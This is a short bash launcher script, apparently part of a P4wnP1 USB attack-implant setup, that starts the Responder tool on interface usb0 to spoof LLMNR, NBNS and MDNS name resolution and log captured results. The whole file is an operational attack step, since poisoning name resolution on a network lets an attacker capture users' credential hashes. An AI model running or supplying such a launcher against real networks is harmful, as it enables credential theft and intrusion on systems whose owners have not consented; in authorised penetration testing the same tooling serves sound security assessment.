#!/bin/bash
# Launch Responder for LLMNR/NBNS/MDNS spoofing

RESP_DIR="/opt/p4wnp1/tools/Responder"
cd "$RESP_DIR"

INTERFACE="usb0"
echo "[+] Starting Responder on $INTERFACE..."
sudo python3 Responder.py -I $INTERFACE -wd ./logs
